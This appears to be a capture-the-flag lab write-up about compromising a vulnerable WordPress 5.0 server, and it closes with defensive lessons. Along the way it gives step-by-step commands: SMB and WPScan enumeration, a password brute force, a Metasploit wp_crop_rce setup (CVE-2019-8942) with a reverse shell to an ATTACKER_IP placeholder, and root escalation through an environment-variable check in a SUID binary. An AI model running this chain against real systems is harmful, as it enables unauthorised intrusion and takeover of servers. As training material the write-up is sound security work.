# WordPress Penetration Testing Lab

## Lab Overview

This room simulates a realistic penetration testing engagement against a self-hosted WordPress blog. The challenge focuses on web enumeration, SMB reconnaissance, weak credentials, exploitation of an outdated WordPress installation, Linux privilege escalation, and analysis of insecure custom binaries.

The attack chain can be summarized as:

```text
Network Enumeration
        |
        v
SMB / WordPress Enumeration
        |
        v
Weak WordPress Credentials
        |
        v
WordPress 5.0 RCE
        |
        v
www-data Shell
        |
        v
Filesystem Enumeration
        |
        v
SUID Binary: /usr/sbin/checker
        |
        v
Environment Variable Abuse
        |
        v
Root Shell
```

## Objectives

* Enumerate exposed network services.
* Identify information disclosed through SMB.
* Enumerate WordPress users.
* Identify and exploit weak administrative credentials.
* Exploit an outdated WordPress installation.
* Obtain an initial shell as `www-data`.
* Locate the legitimate user flag.
* Identify a vulnerable SUID binary.
* Escalate privileges to `root`.
* Retrieve the root flag.

---

## 1. Enumeration and Information Gathering

### Port Scanning

Begin with an Nmap scan to identify open ports and running services:

```bash
nmap -sC -sV -Pn <IP>
```

The scan reveals two important services:

| Port    | Service | Purpose                   |
| ------- | ------- | ------------------------- |
| 80      | HTTP    | WordPress web application |
| 139/445 | SMB     | Windows file sharing      |

The presence of both HTTP and SMB provides multiple avenues for information gathering.

### SMB Enumeration

Enumerate available SMB shares:

```bash
smbclient -L //<IP>/ -N
```

If anonymous access is permitted, connect to the relevant share:

```bash
smbclient //<IP>/<share> -N
```

Alternatively, `enum4linux` can be used for broader SMB enumeration:

```bash
enum4linux -a <IP>
```

The accessible files provide useful information about potential users, including:

* `bjoel`
* `billy`

This information can later be correlated with the WordPress installation.

---

## 2. WordPress Enumeration

Identify the WordPress installation and enumerate its users using WPScan:

```bash
wpscan --url http://<IP> -e u
```

The enumeration identifies WordPress accounts including:

```text
bjoel
kw0ln
```

The account `kw0ln` corresponds to Billy, providing another useful username for the attack surface.

---

## 3. Obtaining WordPress Credentials

The discovered `bjoel` account can be tested against a common password wordlist.

Using WPScan:

```bash
wpscan --url http://<IP> -U bjoel -P /usr/share/wordlists/rockyou.txt
```

Once a valid password is discovered, authenticate through the WordPress login page:

```text
http://<IP>/wp-login.php
```

Successful authentication provides access to the WordPress administration dashboard.

---

## 4. Exploiting WordPress 5.0

The target is running an outdated version of WordPress:

```text
WordPress 5.0
```

This version is affected by vulnerabilities including the image crop functionality vulnerability tracked as:

```text
CVE-2019-8942
```

The vulnerability can be abused to achieve remote code execution when combined with appropriate WordPress access.

### Metasploit

The exploit can be launched through Metasploit:

```bash
msfconsole
```

Then:

```text
use exploit/multi/http/wp_crop_rce
set RHOSTS <IP>
set USERNAME bjoel
set PASSWORD <password>
set LHOST <ATTACKER_IP>
run
```

A successful exploitation results in a reverse shell on the target.

The initial shell is obtained in the context of:

```text
www-data
```

Verify the current user:

```bash
whoami
```

Expected result:

```text
www-data
```

---

## 5. Locating the User Flag

After obtaining shell access, begin enumerating the filesystem.

A tempting location is:

```bash
cat /home/bjoel/user.txt
```

However, this file is intentionally misleading and acts as a rabbit hole.

This highlights an important CTF lesson: finding a file named `user.txt` does not automatically mean that it is the correct flag.

Continue enumerating unusual directories and mounted filesystems:

```bash
ls -la /media
```

Further investigation reveals a USB-mounted directory:

```text
/media/usb/
```

The actual user flag is located at:

```text
/media/usb/user.txt
```

However, the permissions prevent the current `www-data` account from reading it directly.

Therefore, privilege escalation is required.

---

## 6. Privilege Escalation Enumeration

Search the filesystem for SUID-enabled binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Among the results is an unusual custom binary:

```text
/usr/sbin/checker
```

Unlike common system binaries, `checker` is a custom administrative utility and therefore warrants further investigation.

---

## 7. Analyzing the `checker` Binary

Use `ltrace` to observe the library calls and strings used by the binary:

```bash
ltrace /usr/sbin/checker
```

The analysis reveals that the program checks for an environment variable named:

```text
admin
```

Because the binary executes with SUID privileges, its handling of this environment variable becomes security-critical.

The program effectively trusts the value of `admin` when deciding whether to provide privileged access.

---

## 8. Privilege Escalation

Set the required environment variable:

```bash
export admin=1
```

Then execute the SUID binary:

```bash
/usr/sbin/checker
```

The vulnerable binary spawns a shell with elevated privileges.

Confirm the effective user:

```bash
whoami
```

Expected output:

```text
root
```

At this point, full administrative access to the machine has been obtained.

---

## 9. Retrieving the Flags

With root privileges, the legitimate user flag can now be accessed:

```bash
cat /media/usb/user.txt
```

Retrieve the final root flag:

```bash
cat /root/root.txt
```

This completes the privilege escalation chain.

---

## Key Lessons Learned

### 1. Perform Thorough Enumeration

Multiple services can expose different pieces of information. SMB enumeration helped identify usernames that became useful during the WordPress attack.

### 2. Never Ignore Weak Credentials

A weak password on a WordPress account can provide access to the administrative interface and potentially lead to complete server compromise.

### 3. Keep CMS Software Updated

Running an outdated WordPress version exposes the application to publicly documented vulnerabilities. Keeping the CMS, plugins, themes, and underlying operating system patched significantly reduces the attack surface.

### 4. Verify Every Flag

CTF environments frequently use misleading files and rabbit holes. Always inspect the contents and context of a discovered flag rather than assuming the first `user.txt` is legitimate.

### 5. Investigate Unusual SUID Binaries

SUID binaries execute with elevated privileges and should be carefully audited. Custom administrative binaries are particularly important because application-specific logic can introduce privilege-escalation vulnerabilities.

### 6. Environment Variables Can Become Security Boundaries

Privileged programs should never blindly trust attacker-controlled environment variables. The `checker` binary demonstrates how improper environment-variable handling can turn a seemingly harmless administrative utility into a direct root-shell primitive.

## Conclusion

This lab demonstrates a complete penetration-testing workflow against a vulnerable WordPress server. The compromise begins with external enumeration and weak credentials, progresses through exploitation of an outdated CMS, and concludes with local privilege escalation through an insecure SUID binary.

The key takeaway is that a seemingly small weakness, such as a weak WordPress password or poorly designed administrative binary, can become part of a complete attack chain leading from unauthenticated network access to full system compromise.
